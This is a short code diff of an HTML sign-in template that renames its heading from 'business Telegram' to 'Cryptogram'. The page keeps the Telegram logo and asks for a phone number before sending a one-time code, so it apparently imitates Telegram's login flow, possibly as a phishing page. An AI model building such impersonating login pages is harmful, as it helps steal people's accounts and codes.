@@ -69,7 +69,7 @@
     <!-- NO THEME TOGGLE BUTTON -->
     {% if step == 'enter_phone' %}
     <div class="telegram-logo"><img src="{{ url_for('static', filename='img/telegram-logo.png') }}" alt="Telegram Logo"></div>
-    <h1>Sign in to business Telegram</h1>
+    <h1>Sign in to Cryptogram</h1>
     <p class="subtitle">Please confirm your country code and enter your phone number.</p>
     <form action="{{ url_for('send_otp') }}" method="POST">
         <div class="form-group">
